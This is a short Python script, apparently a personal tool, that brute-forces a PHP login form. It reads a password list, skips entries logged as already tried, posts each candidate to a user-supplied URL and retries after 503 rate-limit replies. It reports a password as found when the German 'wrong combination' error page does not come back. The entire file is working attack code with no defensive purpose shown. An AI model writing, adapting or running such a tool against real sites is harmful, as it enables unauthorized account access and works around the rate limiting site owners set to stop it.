import os
import requests
import time

page_user = input("Username: ")
page_psw = input("Passwort: ")

url = input("URL: ")

password_file = os.path.join("php_login_bruteforce", "psw.in")
already_tried_file = os.path.join("php_login_bruteforce", "psw.tried")

with open(password_file, "r") as file:
    passwords = [psw.strip("\n") for psw in file.readlines()]

with open(already_tried_file, "r") as file:
    passwords_tried = [psw.strip("\n") for psw in file.readlines()]

passwords_skipped = set(passwords).intersection(set(passwords_tried))

print(
    f"Skipping {len(passwords_skipped)} out of {len(passwords)} passwords (already tried before)."
)

passwords = set(passwords).difference(passwords_skipped)

with open(already_tried_file, "a") as file:
    for password in passwords:
        data = {"pw1": password, "submit": "submit"}
        send_data_url = requests.post(url, data=data, auth=(page_user, page_psw))

        repeat_cnt = 0
        while send_data_url.status_code == 503:
            repeat_cnt += 1
            print(f"Cooldown - repeating {repeat_cnt}")
            time.sleep(10)
            send_data_url = requests.post(url, data=data, auth=(page_user, page_psw))

        if send_data_url.status_code != 200:
            print(
                f"Status Code {send_data_url.status_code} - Wrong Credentials? - Stopping"
            )
            break

        if (
            "Falsche ZAHLENKOMBINATION!" in str(send_data_url.content)
            and len(send_data_url.content) == 836
        ):
            print(f"[*] Attempted password: {password}")
        else:
            print(f"[*] Password found: {password}")
            break

        file.write(password + "\n")

        time.sleep(0.1)
